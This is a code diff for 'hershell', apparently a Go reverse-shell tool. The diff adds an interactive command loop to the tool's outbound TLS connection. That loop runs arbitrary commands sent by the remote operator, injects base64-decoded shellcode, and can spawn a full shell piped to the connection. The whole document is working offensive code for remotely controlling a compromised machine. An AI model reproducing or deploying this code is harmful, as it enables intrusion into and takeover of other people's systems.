@@ -1,12 +1,15 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"crypto/sha256"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/hex"
 	"net"
 	"os"
+	"os/exec"
 	"strings"
 
 	"./shell"
@@ -23,13 +26,50 @@ var (
 	fingerPrint   string
 )
 
+func InteractiveShell(conn net.Conn) {
+	var (
+		exit   bool   = false
+		prompt string = "[hershell]> "
+	)
+	scanner := bufio.NewScanner(conn)
+
+	conn.Write([]byte(prompt))
+
+	for scanner.Scan() {
+		command := scanner.Text()
+		if len(command) > 1 {
+			argv := strings.Split(command, " ")
+			switch argv[0] {
+			case "inject":
+				if argv[1] != "" {
+					shellcode, err := base64.StdEncoding.DecodeString(argv[1])
+					if err == nil {
+						go shell.ExecShellcode(shellcode)
+					}
+				}
+			case "exit":
+				exit = true
+				break
+			case "run_shell":
+				conn.Write([]byte("Starting shell ...\n"))
+				RunShell(conn)
+			default:
+				shell.ExecuteCmd(command, conn)
+			}
+			if exit {
+				break
+			}
+		}
+		conn.Write([]byte(prompt))
+	}
+}
+
 func RunShell(conn net.Conn) {
-	shell.InteractiveShell(conn)
-	//var cmd *exec.Cmd = shell.GetShell()
-	//cmd.Stdout = conn
-	//cmd.Stderr = conn
-	//cmd.Stdin = conn
-	//cmd.Run()
+	var cmd *exec.Cmd = shell.GetShell()
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Stdin = conn
+	cmd.Run()
 }
 
 func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
@@ -59,7 +99,8 @@ func Reverse(connectString string, fingerprint []byte) {
 	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
-	RunShell(conn)
+	//RunShell(conn)
+	InteractiveShell(conn)
 }
 
 func main() {
